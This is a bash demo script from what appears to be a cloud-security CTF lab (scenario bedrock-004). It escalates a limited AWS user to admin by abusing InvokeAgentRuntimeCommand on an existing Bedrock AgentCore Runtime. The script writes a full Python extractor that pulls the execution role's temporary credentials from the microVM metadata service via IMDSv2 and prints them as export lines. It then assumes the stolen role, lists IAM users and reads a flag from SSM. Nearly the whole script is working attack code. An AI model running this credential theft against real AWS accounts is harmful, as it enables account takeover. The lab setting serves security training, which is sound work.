#!/bin/bash

# Demo script for bedrockagentcore-invokeagentcommand privilege escalation (bedrock-004)
# This scenario demonstrates how a principal with bedrock-agentcore:InvokeAgentRuntimeCommand
# can run arbitrary shell commands inside an EXISTING AgentCore Runtime microVM and extract
# its execution role credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254.
# No iam:PassRole required — the Runtime is already deployed with an admin execution role.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-bedrock-004-to-admin-starting-user"
TARGET_ROLE="pl-prod-bedrock-004-to-admin-target-role"
PYTHON_SCRIPT="/tmp/extract_bedrock_004_creds.py"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}AgentCore Runtime Command Injection to Admin Demo${NC}"
echo -e "${GREEN}Scenario: bedrockagentcore-invokeagentcommand (bedrock-004)${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}This scenario demonstrates exploiting InvokeAgentRuntimeCommand on an EXISTING${NC}"
echo -e "${BLUE}AgentCore Runtime that has a privileged IAM execution role attached.${NC}"
echo -e "${BLUE}No iam:PassRole required — only bedrock-agentcore:InvokeAgentRuntimeCommand!${NC}\n"

# Step 1: Check prerequisites
echo -e "${YELLOW}Step 1: Checking prerequisites${NC}"
echo "Checking for required tools..."

if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed${NC}"
    echo "Please install jq: https://stedolan.github.io/jq/download/"
    exit 1
fi
echo -e "${GREEN}✓ jq is installed${NC}"

if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: python3 is not installed${NC}"
    echo "Please install python3"
    exit 1
fi
echo -e "${GREEN}✓ python3 is installed${NC}"

if ! python3 -c "import boto3" 2>/dev/null; then
    echo -e "${RED}Error: boto3 is not installed${NC}"
    echo "Please install boto3: pip3 install boto3"
    exit 1
fi
# InvokeAgentRuntimeCommand was added in botocore 1.43.36
BOTOCORE_VERSION=$(python3 -c "import botocore; print(botocore.__version__)" 2>/dev/null || echo "0.0.0")
BOTOCORE_REQUIRED="1.43.36"
python3 -c "
import sys
v = tuple(int(x) for x in '${BOTOCORE_VERSION}'.split('.'))
r = tuple(int(x) for x in '${BOTOCORE_REQUIRED}'.split('.'))
sys.exit(0 if v >= r else 1)
" 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${RED}Error: botocore ${BOTOCORE_VERSION} is too old (need >= ${BOTOCORE_REQUIRED})${NC}"
    echo "Please upgrade: pip3 install --upgrade boto3 botocore"
    exit 1
fi
echo -e "${GREEN}✓ boto3 is installed (botocore ${BOTOCORE_VERSION})${NC}"
echo ""

# Step 2: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 2: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_004_bedrockagentcore_invokeagentcommand.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_RUNTIME_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_runtime_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract starting user credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_RUNTIME_ARN" == "null" ] || [ -z "$TARGET_RUNTIME_ARN" ]; then
    echo -e "${RED}Error: Could not extract target runtime ARN from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target Runtime ARN: $TARGET_RUNTIME_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 3: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 3: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 4: Get account ID
echo -e "${YELLOW}Step 4: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 6: Discover the target runtime
echo -e "${YELLOW}Step 6: Discovering existing AgentCore Runtimes${NC}"
echo "An attacker would enumerate runtimes to find a target with a privileged execution role."
echo ""

# List runtimes uses a helpful permission — switch to readonly so the restriction policy
# (which adds an explicit Deny on helpful permissions to the starting user) does not block it.
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "ReadOnly" "aws bedrock-agentcore-control list-agent-runtimes --region $AWS_REGION --output json"
RUNTIMES_OUTPUT=$(aws bedrock-agentcore-control list-agent-runtimes \
    --region "$AWS_REGION" \
    --output json 2>&1)

if [ $? -eq 0 ]; then
    RUNTIME_COUNT=$(echo "$RUNTIMES_OUTPUT" | jq -r '.agentRuntimes | length' 2>/dev/null || echo "0")
    echo "Found $RUNTIME_COUNT runtime(s)"
    echo "$RUNTIMES_OUTPUT" | jq -r '.agentRuntimes[] | "  - \(.agentRuntimeId) (\(.status))"' 2>/dev/null || true
else
    echo -e "${YELLOW}Note: Could not list runtimes — proceeding with known target ARN from Terraform${NC}"
fi
echo ""

# [OBSERVATION] Step 7: Inspect the target runtime's execution role
echo -e "${YELLOW}Step 7: Inspecting target runtime configuration${NC}"
echo "Describing the target runtime to confirm it uses an admin execution role..."
echo "Target Runtime ARN: $TARGET_RUNTIME_ARN"
echo ""

show_cmd "ReadOnly" "aws bedrock-agentcore-control get-agent-runtime --agent-runtime-id $TARGET_RUNTIME_ARN --region $AWS_REGION --output json"
RUNTIME_DETAILS=$(aws bedrock-agentcore-control get-agent-runtime \
    --agent-runtime-id "$TARGET_RUNTIME_ARN" \
    --region "$AWS_REGION" \
    --output json 2>&1)

if [ $? -eq 0 ]; then
    EXEC_ROLE=$(echo "$RUNTIME_DETAILS" | jq -r '.executionRoleArn // "unknown"')
    RUNTIME_STATUS=$(echo "$RUNTIME_DETAILS" | jq -r '.status // "unknown"')
    AUTH_TYPE=$(echo "$RUNTIME_DETAILS" | jq -r '.networkConfiguration.inboundAuthType // .authorizerConfiguration.type // "unknown"')
    echo "  Execution Role: $EXEC_ROLE"
    echo "  Status:         $RUNTIME_STATUS"
    echo "  Inbound Auth:   $AUTH_TYPE"
    echo ""
    if [[ "$EXEC_ROLE" == *"$TARGET_ROLE"* ]]; then
        echo -e "${GREEN}✓ Confirmed: runtime uses the admin execution role${NC}"
    else
        echo -e "${YELLOW}Note: execution role is $EXEC_ROLE${NC}"
    fi
else
    echo -e "${YELLOW}Note: Could not describe runtime — proceeding with known target${NC}"
fi
echo ""

# Step 8: Write the Python credential-extraction script
echo -e "${YELLOW}Step 8: Writing credential extraction script${NC}"
echo "Writing Python script to: $PYTHON_SCRIPT"

cat > "$PYTHON_SCRIPT" << 'PYTHON_EOF'
#!/usr/bin/env python3
"""
Bedrock AgentCore Runtime Command Injection — Credential Extraction (bedrock-004)

Calls bedrock-agentcore:InvokeAgentRuntimeCommand to run a Python command
inside the target Runtime's container (python:3.12-slim). The command reads
the execution role's temporary credentials from the MicroVM Metadata Service
(MMDS) at 169.254.169.254 via IMDSv2 and prints them to stdout.

The container's HTTP response body is streamed back as contentDelta chunks.
We accumulate stdout across all chunks until the stream closes.

Usage: python3 extract_bedrock_004_creds.py <runtime-arn> <region>
"""

import boto3
import json
import sys
import uuid

if len(sys.argv) < 3:
    print("Usage: python3 extract_bedrock_004_creds.py <runtime-arn> <region>")
    sys.exit(1)

RUNTIME_ARN = sys.argv[1]
REGION = sys.argv[2]

# Two-step MMDS read via Python stdlib (container is python:3.12-slim, no curl).
# Discovers the attached role name first, then fetches its credentials.
BASH_COMMAND = """python3 -c "
import urllib.request
BASE = 'http://169.254.169.254/latest'
tok_req = urllib.request.Request(BASE+'/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'})
with urllib.request.urlopen(tok_req, timeout=5) as r: token = r.read().decode().strip()
h = {'X-aws-ec2-metadata-token': token}
role_req = urllib.request.Request(BASE+'/meta-data/iam/security-credentials/', headers=h)
with urllib.request.urlopen(role_req, timeout=5) as r: role = r.read().decode().strip()
creds_req = urllib.request.Request(BASE+'/meta-data/iam/security-credentials/'+role, headers=h)
with urllib.request.urlopen(creds_req, timeout=5) as r: print(r.read().decode())
\""""

print(f"[*] Target Runtime ARN : {RUNTIME_ARN}")
print(f"[*] Region             : {REGION}")
print(f"[*] Calling bedrock-agentcore:InvokeAgentRuntimeCommand ...")

client = boto3.client("bedrock-agentcore", region_name=REGION)

try:
    response = client.invoke_agent_runtime_command(
        agentRuntimeArn=RUNTIME_ARN,
        runtimeSessionId=str(uuid.uuid4()),
        body={"command": BASH_COMMAND, "timeout": 30},
    )
except Exception as exc:
    print(f"[-] InvokeAgentRuntimeCommand failed: {exc}")
    sys.exit(1)

stdout_chunks = []
for event in response["stream"]:
    chunk = event.get("chunk", {})
    if "contentDelta" in chunk:
        delta = chunk["contentDelta"]
        if "stdout" in delta:
            stdout_chunks.append(delta["stdout"])
        if "stderr" in delta and delta["stderr"].strip():
            print(f"[stderr] {delta['stderr'].strip()}", file=sys.stderr)

raw_output = "".join(stdout_chunks).strip()

if not raw_output:
    print("[-] No output received from the runtime command")
    sys.exit(1)

print("[+] Received output from runtime microVM")

try:
    creds = json.loads(raw_output)
except json.JSONDecodeError:
    print("[-] Could not parse credentials JSON from output:")
    print(raw_output)
    sys.exit(1)

access_key    = creds.get("AccessKeyId", "")
secret_key    = creds.get("SecretAccessKey", "")
session_token = creds.get("Token", "")
expiration    = creds.get("Expiration", "N/A")

if not access_key or not secret_key or not session_token:
    print("[-] Incomplete credentials in MMDS response:")
    print(raw_output)
    sys.exit(1)

print("\n" + "=" * 60)
print("EXTRACTED CREDENTIALS (from execution role via MMDS):")
print("=" * 60)
print(f"AccessKeyId     : {access_key}")
print(f"SecretAccessKey : {secret_key[:20]}...")
print(f"Token           : {session_token[:50]}...")
print(f"Expiration      : {expiration}")
print("=" * 60 + "\n")

print("# Export these credentials to use them:")
print(f"export AWS_ACCESS_KEY_ID='{access_key}'")
print(f"export AWS_SECRET_ACCESS_KEY='{secret_key}'")
print(f"export AWS_SESSION_TOKEN='{session_token}'")
PYTHON_EOF

chmod +x "$PYTHON_SCRIPT"
echo -e "${GREEN}✓ Credential extraction script written${NC}\n"

# [EXPLOIT] Step 9: Execute InvokeAgentRuntimeCommand to steal MMDS credentials
echo -e "${YELLOW}Step 9: Invoking AgentCore Runtime command to extract MMDS credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Running Python script against target runtime..."
echo ""

show_attack_cmd "Attacker" "python3 $PYTHON_SCRIPT $TARGET_RUNTIME_ARN $AWS_REGION"
SCRIPT_OUTPUT=$(python3 "$PYTHON_SCRIPT" "$TARGET_RUNTIME_ARN" "$AWS_REGION" 2>&1)

echo "$SCRIPT_OUTPUT"
echo ""

# Parse the exported credential lines from the script output
EXTRACTED_ACCESS_KEY=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_ACCESS_KEY_ID" | sed "s/.*='\(.*\)'/\1/")
EXTRACTED_SECRET_KEY=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_SECRET_ACCESS_KEY" | sed "s/.*='\(.*\)'/\1/")
EXTRACTED_SESSION_TOKEN=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_SESSION_TOKEN" | sed "s/.*='\(.*\)'/\1/")

if [ -z "$EXTRACTED_ACCESS_KEY" ] || [ -z "$EXTRACTED_SECRET_KEY" ] || [ -z "$EXTRACTED_SESSION_TOKEN" ]; then
    echo -e "${RED}Error: Failed to extract credentials from MMDS response${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted execution role credentials from MMDS!${NC}\n"

# [EXPLOIT] Step 10: Switch to the extracted execution role credentials
echo -e "${YELLOW}Step 10: Switching to extracted execution role credentials${NC}"
# These are the target role's temporary credentials stolen from MMDS inside the microVM
export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Verifying identity with extracted credentials..."
show_cmd "Attacker (stolen role)" "aws sts get-caller-identity --query 'Arn' --output text"
ELEVATED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ELEVATED_IDENTITY"

if [[ "$ELEVATED_IDENTITY" == *"$TARGET_ROLE"* ]]; then
    echo -e "${GREEN}✓ Successfully operating as the admin execution role!${NC}"
else
    echo -e "${YELLOW}Note: operating as $ELEVATED_IDENTITY${NC}"
fi
echo ""

# [EXPLOIT] Step 11: Verify administrator access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users with the stolen execution role credentials..."
echo ""

show_cmd "Attacker (stolen role)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 12: Capture the CTF flag
# The stolen execution role credentials carry full admin permissions, which include
# ssm:GetParameter. We read the flag directly using those credentials.
echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/bedrock-004-to-admin"

show_attack_cmd "Attacker (stolen role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter \
    --name "$FLAG_PARAM_NAME" \
    --query 'Parameter.Value' \
    --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
DEMO_COMPLETED=1

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (only bedrock-agentcore:InvokeAgentRuntimeCommand)"
echo "2. Discovered existing Runtime with admin execution role: $TARGET_RUNTIME_ARN"
echo "3. Confirmed runtime uses privileged role: $TARGET_ROLE"
echo "4. Invoked InvokeAgentRuntimeCommand with IMDSv2 curl command"
echo "5. Extracted temporary credentials from MMDS at 169.254.169.254"
echo "6. Gained full admin access as the execution role"
echo "7. Captured CTF flag from SSM: $FLAG_VALUE"

echo -e "\n${YELLOW}Key Points:${NC}"
echo "- No iam:PassRole required (Runtime already exists with admin role)"
echo "- Only needs: bedrock-agentcore:InvokeAgentRuntimeCommand"
echo "- InvokeAgentRuntimeCommand runs arbitrary shell commands inside the Runtime microVM"
echo "- The microVM's MMDS exposes the execution role's temporary credentials"
echo "- Credentials have the full permissions of the attached execution role"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  → (bedrock-agentcore:InvokeAgentRuntimeCommand)"
echo "  → Runtime microVM shell → IMDSv2 MMDS credential theft"
echo "  → $TARGET_ROLE (Admin)"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Python script: $PYTHON_SCRIPT"
echo "- Extracted temporary credentials (will expire)"

echo -e "\n${RED}⚠ Warning: The extracted credentials are temporary and will expire${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
